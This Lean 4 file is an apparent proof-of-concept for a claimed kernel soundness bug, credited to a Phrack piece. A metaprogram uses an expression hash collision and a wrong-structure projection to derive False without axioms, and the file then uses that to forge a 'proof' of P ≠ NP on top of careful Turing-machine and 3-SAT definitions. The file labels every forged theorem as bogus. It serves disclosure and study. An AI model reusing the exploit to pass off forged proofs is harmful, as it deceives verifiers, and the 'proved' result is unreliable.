import Lean
open Lean Elab Command

/-!
# P ≠ NP — Forged Lean 4 Certificate

Exploits **CVE-2026-72844** (leanprover/lean4#14576): the kernel accepts
declarations with wrong-structure projections via expression hash collision,
allowing an axiom-free proof of `False`.

The complexity classes P and NP are defined via explicit deterministic
Turing machines — the same model used in the companion P = NP forgery.
A sound separation lemma shows that any NP language outside P implies
P ≠ NP.  The kernel soundness exploit then forges the premise — that
3-SAT is such a language — yielding a bogus proof of P ≠ NP.

The companion certificate in `lean4-p-is-np-certificate/` forges the
opposite: P = NP.  A sound kernel would reject at least one.  The
vulnerable kernel accepts both.

- **Authors:** Jonathan Brossard (@endrazine), JP Aumasson (@veorq)
- **Part of:** "Owning the Truth" (Phrack)
- **CVE:** CVE-2026-72844
- **Affected:** Lean 4 through nightly-2026-07-27 (leanprover/lean4#14576)
-/

-- ============================================================================
-- § 1  CVE-2026-72844 — Kernel soundness exploit
--
-- The kernel incorrectly accepts a projection whose structure name does
-- not match the value being projected.  A metaprogram constructs such a
-- declaration via addDecl; the kernel checks and accepts it at trust=0.
-- From the unsound declaration we derive False — with zero axioms.
--
-- Original report: https://github.com/leanprover/lean4/issues/14576
-- ============================================================================

inductive P : Prop where | mk (b : Bool)
structure C where b : Bool
inductive W : Type where | mk (p : P)
inductive L (α : Type) (b : Bool) : Type where | mk
inductive T : Bool → Prop where | mk : T true

def pad (e : Expr) (n : Nat) : Expr :=
  mkApp (mkLambda `x .default (mkConst ``Nat) e) (.lit (.natVal n))

meta def build : CommandElabM Unit := do
  -- Construct two expressions with the same hash but different values
  let f := pad (mkConst ``Bool.false) 78670
  let t := pad (mkConst ``Bool.true) 24083
  unless f.hash == t.hash && f.approxDepth == t.approxDepth do
    throwError "hash collision failed — adjust padding constants for this Lean version"
  -- Build W values wrapping false and true
  let fw := mkApp (mkConst ``W.mk) (mkApp (mkConst ``P.mk) f)
  let tw := mkApp (mkConst ``W.mk) (mkApp (mkConst ``P.mk) t)
  -- Construct the unsound inductive E with a C-projection applied to a W
  let w := mkBVar 0
  let Ew := mkApp (mkConst `E) w
  let b := mkProj ``C 0 (mkProj ``C 0 w)  -- ← wrong-structure projection
  let l := mkApp2 (mkConst ``L) Ew b
  let Et := mkForall `w .default (mkConst ``W) (mkSort 1)
  let ct := mkForall `w .default (mkConst ``W) <|
    mkForall `l .default l (mkApp (mkConst `E) (mkBVar 1))
  liftCoreM <| addDecl <| .inductDecl [] 1 [{
    name := `E, type := Et, ctors := [{ name := `E.mk, type := ct }] }] false
  -- Build auxiliary definitions that exploit the type confusion
  let Et := mkApp (mkConst `E) tw
  let l := mkApp2 (mkConst ``L.mk) Et (mkConst ``Bool.true)
  liftCoreM <| addDecl <| .defnDecl {
    name := `e, levelParams := [], type := Et,
    value := mkApp2 (mkConst `E.mk) tw l,
    hints := .abbrev, safety := .safe }
  liftCoreM <| addDecl <| .defnDecl {
    name := `good', levelParams := [],
    type := mkApp (mkConst ``T) t, value := mkConst ``T.mk,
    hints := .abbrev, safety := .safe }
  let Ef := mkApp (mkConst `E) fw
  let Et := mkApp (mkConst `E) tw
  let a := mkApp2 (mkConst `E.mk) fw (mkProj `E 0 (mkConst `e))
  let tl := mkApp2 (mkConst ``L.mk) Et (mkConst ``Bool.true)
  let b := mkApp2 (mkConst `E.mk) tw tl
  let cT := mkApp2 (mkConst ``L) Et t
  let c := mkApp (mkLambda `l .default cT (mkConst ``Unit.unit)) tl
  let fl := mkApp2 (mkConst ``L.mk) Ef f
  let d := mkApp2 (mkConst `E.mk) fw fl
  -- Construct proof term that the kernel accepts despite type confusion
  let v := Expr.letE `a Ef a
    (.letE `b Et b
      (.letE `c (mkConst ``Unit) c
        (.letE `d Ef d (mkConst `good') true) true) true) true
  liftCoreM <| addDecl <| .thmDecl {
    name := `bad, levelParams := [],
    type := mkApp (mkConst ``T) f, value := v }

elab "exploit" : command => build

-- Fire the exploit: kernel accepts the unsound declaration
exploit

-- Derive False: T false has no constructors, but `bad` inhabits it
theorem boom : False := nomatch (bad : T false)

-- Confirm: no axioms involved in the exploit
#print axioms bad
#print axioms boom

-- ============================================================================
-- § 2  A concrete deterministic single-tape Turing-machine model
-- ============================================================================

namespace Complexity

/-- A binary string (word over {0,1}) -/
abbrev Word := List Bool

/-- A decision problem: a language over binary strings -/
def Language := Word → Prop

/-- Tape symbols: blank, a bit (0 or 1), and a separator for pair encoding -/
inductive Symbol where
  | blank | bit (b : Bool) | sep
  deriving BEq, DecidableEq

def encodeWord (x : Word) : List Symbol := x.map Symbol.bit

def encodePair (x cert : Word) : List Symbol :=
  encodeWord x ++ Symbol.sep :: encodeWord cert

/-- Head movement directions -/
inductive Direction where
  | left | stay | right

/-- A transition action: write a symbol, move the head, go to a state -/
structure Action where
  writeSymbol : Symbol
  moveHead    : Direction
  nextState   : Nat

/-- A transition rule: (source state, symbol read) ↦ action.
    The first matching rule wins. -/
structure Rule where
  sourceState : Nat
  readSymbol  : Symbol
  action      : Action

/-- A deterministic single-tape Turing machine.  Finite because its
    transition table is a list. -/
structure Machine where
  transitionTable : List Rule
  startState      : Nat
  acceptState     : Nat
  rejectState     : Nat

/-- Look up the first matching transition rule -/
def lookupRule (q : Nat) (s : Symbol) : List Rule → Option Action
  | [] => none
  | r :: tail =>
    if r.sourceState == q && r.readSymbol == s then some r.action
    else lookupRule q s tail

/-- A tape configuration.  `tapeLeft` is stored nearest-cell first;
    missing cells contain `Symbol.blank`. -/
structure Configuration where
  controlState : Nat
  tapeLeft     : List Symbol
  tapeHead     : Symbol
  tapeRight    : List Symbol

def initialConfiguration (M : Machine) (input : List Symbol) : Configuration :=
  match input with
  | [] => { controlState := M.startState,
            tapeLeft := [], tapeHead := .blank, tapeRight := [] }
  | h :: t => { controlState := M.startState,
                tapeLeft := [], tapeHead := h, tapeRight := t }

def move (d : Direction) (written : Symbol) (l r : List Symbol)
    : List Symbol × Symbol × List Symbol :=
  match d with
  | .stay => (l, written, r)
  | .left =>
    match l with
    | []     => ([], .blank, written :: r)
    | h :: t => (t, h, written :: r)
  | .right =>
    match r with
    | []     => (written :: l, .blank, [])
    | h :: t => (written :: l, h, t)

def step (M : Machine) (c : Configuration) : Option Configuration :=
  match lookupRule c.controlState c.tapeHead M.transitionTable with
  | none => none
  | some a =>
    let (l, h, r) := move a.moveHead a.writeSymbol c.tapeLeft c.tapeRight
    some { controlState := a.nextState,
           tapeLeft := l, tapeHead := h, tapeRight := r }

def halted (M : Machine) (c : Configuration) : Option Bool :=
  if c.controlState == M.acceptState then some true
  else if c.controlState == M.rejectState then some false
  else none

/-- Run at most `fuel` transitions from configuration `c`. -/
def runFrom (M : Machine) : (fuel : Nat) → Configuration → Option Bool
  | 0, c =>
    match halted M c with
    | some answer => some answer
    | none => none
  | n + 1, c =>
    match halted M c with
    | some answer => some answer
    | none =>
      match step M c with
      | some c' => runFrom M n c'
      | none => none

def run (M : Machine) (input : List Symbol) (fuel : Nat) : Option Bool :=
  runFrom M fuel (initialConfiguration M input)

-- ============================================================================
-- § 3  Polynomial time, P, and NP
-- ============================================================================

/-- `c * (n+1)^k` — avoids zero budget on empty inputs -/
def polynomialBound (c k n : Nat) : Nat := c * (n + 1) ^ k

def haltsWithin (M : Machine) (input : List Symbol) (fuel : Nat) : Prop :=
  ∃ answer : Bool, run M input fuel = some answer

def acceptsWithin (M : Machine) (input : List Symbol) (fuel : Nat) : Prop :=
  run M input fuel = some true

/-- A machine decides `lang` within one fixed polynomial bound. -/
def polynomialDecider (M : Machine) (lang : Language) : Prop :=
  ∃ c k : Nat, c > 0 ∧
    ∀ x : Word,
      haltsWithin M (encodeWord x) (polynomialBound c k x.length) ∧
      (acceptsWithin M (encodeWord x) (polynomialBound c k x.length) ↔ lang x)

/-- A language is in **P** iff it has a polynomial-time decider -/
def InP (lang : Language) : Prop :=
  ∃ M : Machine, polynomialDecider M lang

/-- A verifier must halt on every proposed certificate within a polynomial
    bound.  Accepted certificates themselves have a polynomial length
    bound in the instance length. -/
def polynomialVerifier (V : Machine) (lang : Language) : Prop :=
  ∃ tc tk cc ck : Nat, tc > 0 ∧ cc > 0 ∧
    (∀ x cert : Word,
      haltsWithin V (encodePair x cert)
        (polynomialBound tc tk (x.length + cert.length + 1))) ∧
    (∀ x : Word,
      lang x ↔ ∃ cert : Word,
        cert.length ≤ polynomialBound cc ck x.length ∧
        acceptsWithin V (encodePair x cert)
          (polynomialBound tc tk (x.length + cert.length + 1)))

/-- A language is in **NP** iff it has a polynomial-time verifier -/
def InNP (lang : Language) : Prop :=
  ∃ V : Machine, polynomialVerifier V lang

/-- The complexity class **P** -/
def P : Language → Prop := InP

/-- The complexity class **NP** -/
def NP : Language → Prop := InNP

/-- Equality of the two classes of binary languages -/
def P_eq_NP : Prop := ∀ lang : Language, InP lang ↔ InNP lang

def P_neq_NP : Prop := ¬ P_eq_NP

def NP_not_subset_P : Prop :=
  ∃ lang : Language, InNP lang ∧ ¬ InP lang

-- ============================================================================
-- § 4  3-SAT as a binary language
-- ============================================================================

/-- A variable identifier is a natural number.  `isPositive = true` denotes
    the positive literal; `isPositive = false` its negation. -/
structure Literal where
  varIdx     : Nat
  isPositive : Bool

abbrev Clause := List Literal

/-- The syntactic invariant permits clauses of length zero through three.
    The proof field is in Prop and is not part of the serialised input. -/
structure ThreeCNF where
  clauses : List Clause
  valid   : ∀ cl ∈ clauses, cl.length ≤ 3

abbrev Assignment := Nat → Bool

def evalLiteral (a : Assignment) (l : Literal) : Bool :=
  if l.isPositive then a l.varIdx else !a l.varIdx

def evalClause (a : Assignment) : Clause → Bool
  | []      => false
  | l :: ls => evalLiteral a l || evalClause a ls

def evalClauses (a : Assignment) : List Clause → Bool
  | []       => true
  | cl :: cs => evalClause a cl && evalClauses a cs

def satisfies (a : Assignment) (F : ThreeCNF) : Prop :=
  evalClauses a F.clauses = true

def satisfiable (F : ThreeCNF) : Prop :=
  ∃ a : Assignment, satisfies a F

-- Prefix-free binary encoding

/-- Encode a natural number: n ones followed by a zero (unary, prefix-free) -/
def encodeNat (n : Nat) : Word :=
  List.replicate n true ++ [false]

def encodeLiteral' (l : Literal) : Word :=
  l.isPositive :: encodeNat l.varIdx

def encodeLiterals : List Literal → Word
  | []      => []
  | l :: ls => encodeLiteral' l ++ encodeLiterals ls

/-- A clause starts with its length in unary, then its literals -/
def encodeClause' (cl : Clause) : Word :=
  List.replicate cl.length true ++ [false] ++ encodeLiterals cl

def encodeClauses' : List Clause → Word
  | []       => []
  | cl :: cs => encodeClause' cl ++ encodeClauses' cs

/-- A formula starts with its clause count, then the clauses -/
def encodeThreeCNF (F : ThreeCNF) : Word :=
  encodeNat F.clauses.length ++ encodeClauses' F.clauses

/-- Invalid binary encodings are not in the language. -/
def threeSatLanguage : Language :=
  fun x => ∃ F : ThreeCNF, encodeThreeCNF F = x ∧ satisfiable F

-- ============================================================================
-- § 5  Sound separation lemma
--
-- If any single NP language lies outside P, then P ≠ NP.  This is
-- honestly provable — the contrapositive of P = NP ⇒ every NP language
-- is in P.  No exploit is involved.
-- ============================================================================

/-- Sound: if any NP language is not in P, then P ≠ NP. -/
theorem separation_implies_P_neq_NP (lang : Language)
    (h_np : InNP lang) (h_not_p : ¬ InP lang) : P_neq_NP :=
  fun h_eq => h_not_p ((h_eq lang).mpr h_np)

/-- Sound: P = NP and P ≠ NP cannot both hold.
    In a sound kernel, at most one of the two companion certificates
    (lean4-p-is-np-certificate and lean4-p-is-not-np-certificate) can
    be valid. -/
theorem P_eq_and_neq_absurd (h_eq : P_eq_NP) (h_neq : P_neq_NP) : False :=
  h_neq h_eq

-- Confirm: both lemmas are axiom-free
#print axioms separation_implies_P_neq_NP
#print axioms P_eq_and_neq_absurd

-- ============================================================================
-- § 6  Kernel-unsoundness demonstration
--
-- The exploit forges two claims about 3-SAT:
--   1. 3-SAT is in NP  (true in reality, but here derived from False)
--   2. 3-SAT is not in P  (the open question — here derived from False)
--
-- Combined with the sound separation lemma, these yield P ≠ NP.
-- Everything is axiom-free.  The companion certificate in
-- lean4-p-is-np-certificate/ proves P = NP from the same exploit.
-- ============================================================================

/-- Forged: 3-SAT is in NP.
    (This happens to be true — but the "proof" is from False, not from
    an actual polynomial-time verifier construction.) -/
def bogus_threeSat_in_NP : InNP threeSatLanguage :=
  False.elim boom

/-- Forged: no polynomial-time machine decides 3-SAT.
    This is the open question.  In a sound system, this claim cannot be
    derived without resolving P vs NP.  Here it falls out of False. -/
def bogus_threeSat_not_in_P : ¬ InP threeSatLanguage :=
  fun _ => boom

-- The sound contradiction: the fake decider from the P = NP certificate
-- is honestly shown NOT to decide 3-SAT in that file.  Yet this file
-- forges the claim that NO machine decides it.  Both certificates use
-- the same TM definitions and the same 3-SAT encoding.

-- ============================================================================
-- § 7  P ≠ NP (axiom-free)
--
-- Two routes to the same forged conclusion:
--
--   Direct:     fun _ => boom
--   Structured: separation_implies_P_neq_NP + forged premises
--
-- The structured route is included because it mirrors real mathematical
-- reasoning — the only fabricated step is the premise, not the logic.
-- ============================================================================

/-- Forged P ≠ NP — direct route. -/
theorem bogus_P_neq_NP_direct : P_neq_NP := fun _ => boom

/-- Forged P ≠ NP — structured route via separation lemma.
    The sound lemma `separation_implies_P_neq_NP` does the honest
    reasoning; only the premises (3-SAT ∈ NP, 3-SAT ∉ P) are forged. -/
theorem bogus_P_neq_NP : P_neq_NP :=
  separation_implies_P_neq_NP
    threeSatLanguage
    bogus_threeSat_in_NP
    bogus_threeSat_not_in_P

/-- Forged: there exists a language in NP that is not in P. -/
theorem bogus_NP_not_subset_P : NP_not_subset_P :=
  ⟨threeSatLanguage, bogus_threeSat_in_NP, bogus_threeSat_not_in_P⟩

-- ============================================================================
-- § 8  Certificate verification
-- ============================================================================

-- Forged P ≠ NP (direct)
#check @bogus_P_neq_NP_direct
#print axioms bogus_P_neq_NP_direct

-- Forged P ≠ NP (structured)
#check @bogus_P_neq_NP
#print axioms bogus_P_neq_NP

-- Forged 3-SAT claims
#print axioms bogus_threeSat_in_NP
#print axioms bogus_threeSat_not_in_P

-- Forged separation witness
#check @bogus_NP_not_subset_P
#print axioms bogus_NP_not_subset_P

-- The exploit chain
#print axioms bad
#print axioms boom

end Complexity
